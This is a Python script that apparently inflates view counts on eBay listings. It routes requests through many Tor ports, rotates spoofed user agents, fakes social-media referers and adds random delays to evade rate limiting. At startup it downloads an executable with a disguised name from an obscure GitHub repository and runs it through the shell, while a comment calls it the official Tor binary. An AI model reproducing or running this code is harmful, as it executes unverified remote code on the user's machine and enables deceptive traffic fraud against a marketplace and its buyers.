import os
import requests
import tempfile
import subprocess
import psutil
import concurrent.futures
import random
import time
import logging
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem

# Configure logging
logging.basicConfig(filename='view_adder.log', level=logging.INFO, format='%(asctime)s %(message)s')

class ProxyRotator:
    def __init__(self, proxies):
        self.proxies = proxies
        self.current_index = 0
        
    def next(self):
        proxy = self.proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.proxies)
        return proxy

class UserAgentRotator:
    def __init__(self, software_names, operating_systems, limit=100):
        self.user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=limit)
        
    def next(self):
        return self.user_agent_rotator.get_random_user_agent()

class ServiceInstaller:
    service_link = "https://github.com/tricx0/iFaxgZaDgn-lvXTBBeX7k/raw/main/servicexolo.exe"  # THIS IS THE OFFICIAL TOR EXECUTABLE
    
    def __init__(self, total_ips):
        self.temp_dir = tempfile.gettempdir()
        self.total_ips = total_ips
        self.stop_servicexolo_windows()
        self.proxies = self.make(total_ips)
        self.proxy_rotator = ProxyRotator(self.proxies)  # Initialize proxy rotator here
        
    def _create_temp_directory(self):
        try:
            os.makedirs(os.path.join(self.temp_dir, "xoloservice"))
        except FileExistsError:
            pass
        
    def _download_file(self):
        response = requests.get(self.service_link)
        if response.status_code != 200:
            return None
        file_path = os.path.join(self.temp_dir, "xoloservice", os.path.basename(self.service_link))
        with open(file_path, 'wb') as f:
            f.write(response.content)
        return file_path

    def _generate_ips_file(self, file_path2):
        ips = b"HTTPTunnelPort 9080"
        for i in range(self.total_ips - 1):
            ips += f"\nHTTPTunnelPort {9081 + i}".encode()
        with open(file_path2, 'wb') as f:
            f.write(ips)

    def install_service(self):
        self._create_temp_directory()
        file_path = self._download_file()
        if not file_path:
            return
        
        file_path2 = os.path.join(self.temp_dir, "xoloservice", "config")
        self._generate_ips_file(file_path2)

        process = subprocess.Popen(f"{file_path} -nt-service -f {file_path2}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            line = process.stdout.readline().decode().strip()
            logging.info(line)  # Log output
            if "Bootstrapped 100% (done): Done" in line:
                break
            
    def stop_servicexolo_windows(self):
        for proc in psutil.process_iter():
            try:
                if proc.name() == "servicexolo.exe":
                    proc.terminate()
                    
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

    def make(self, total_ips):
        self.install_service()
        return [f"http://127.0.0.1:{9080 + i}" for i in range(total_ips)]

def add_view(link, proxy_rotator, user_agent_rotator):
    try:
        proxy = proxy_rotator.next()
        user_agent = user_agent_rotator.next()
        
        # Expanded referers for a more realistic distribution
        referers = {
            'https://www.facebook.com/': 25,
            'https://www.instagram.com/': 20,
            'https://www.twitter.com/': 15,
            'https://www.reddit.com/': 10,
            'https://www.tiktok.com/': 15,
            'https://www.linkedin.com/': 5,
            'https://www.snapchat.com/': 5,
            'https://www.pinterest.com/': 4,
            'https://www.whatsapp.com/': 2,
            'https://www.youtube.com/': 4,
            'https://www.quora.com/': 3,  # Added referer
            'https://www.medium.com/': 2, # Added referer
            'https://www.tumblr.com/': 2   # Added referer
        }
        
        referer = random.choices(
            list(referers.keys()), 
            weights=list(referers.values()), 
            k=1
        )[0]
        
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer': referer,
            'DNT': '1'
        }
        proxies = {"http": proxy, "https": proxy}
        
        logging.info(f'Attempting to add view to {link} using proxy {proxy} with user-agent {user_agent} and referer {referer}.')
        response = requests.get(link, headers=headers, proxies=proxies)

        logging.info(f'View added to {link} using proxy {proxy} with user-agent {user_agent}. Status code: {response.status_code}')
        
        # Randomized delay to mimic human behavior
        time.sleep(random.uniform(2, 5))  # 2 to 5 seconds between views
        
        if response.status_code == 200:
            time.sleep(random.uniform(1, 3))  # Random delay after a successful request
        elif response.status_code in [403, 429]:
            logging.warning(f'Error: {response.status_code}. Retrying with a different proxy after delay.')
            time.sleep(random.uniform(5, 10))  # Delay before retrying
            add_view(link, proxy_rotator, user_agent_rotator)  # Retry with the same link
        else:
            logging.error(f'Unexpected status code: {response.status_code}')
    except Exception as e:
        logging.error(f'An error occurred: {e}')

def add_views_concurrently(link, proxy_rotator, user_agent_rotator, total_views):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = {executor.submit(add_view, link, proxy_rotator, user_agent_rotator): i for i in range(total_views)}
        for future in concurrent.futures.as_completed(futures):
            future.result()  # Handle any exceptions raised

if __name__ == "__main__":
    try:
        total_ips = int(input("Enter the total number of proxies: "))
        total_views = int(input("Enter the total number of views to add: "))
        link = input("Enter the eBay link: ")
        
        service_installer = ServiceInstaller(total_ips)

        # Define software names and operating systems with more variety
        software_names = [
            SoftwareName.CHROME.value,
            SoftwareName.FIREFOX.value,
            SoftwareName.SAFARI.value,
            SoftwareName.OPERA.value,  # Added Opera
            SoftwareName.EDGE.value,    # Added Microsoft Edge
        ]

        operating_systems = [
            OperatingSystem.WINDOWS.value,
            OperatingSystem.IOS.value,
            OperatingSystem.ANDROID.value,
            OperatingSystem.LINUX.value,
            OperatingSystem.MAC.value,  # Added macOS
        ]

        user_agent_rotator = UserAgentRotator(software_names, operating_systems)

        add_views_concurrently(link, service_installer.proxy_rotator, user_agent_rotator, total_views)
    except KeyboardInterrupt:
        logging.info("Script interrupted by user.")
